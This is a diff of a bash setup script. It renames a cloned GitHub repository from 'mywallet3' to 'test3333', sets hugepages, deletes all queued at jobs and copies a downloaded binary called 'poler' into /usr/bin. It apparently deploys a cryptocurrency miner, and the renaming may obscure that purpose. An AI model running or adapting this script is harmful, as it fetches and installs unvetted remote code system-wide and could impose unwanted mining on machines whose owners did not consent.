@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/mywallet3/
+rm -rf /tmp/test3333/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir mywallet3
-git clone https://github.com/burkabest/mywallet3.git /tmp/mywallet3
-cd /tmp/mywallet3
-chmod +x /tmp/mywallet3/poler
+cd /tmp && mkdir test3333
+git clone https://github.com/burkabest/test3333.git /tmp/test3333
+cd /tmp/test3333
+chmod +x /tmp/test3333/poler
 chmod 777 ./*.sh
-cp /tmp/mywallet3/poler /usr/bin/
+cp /tmp/test3333/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
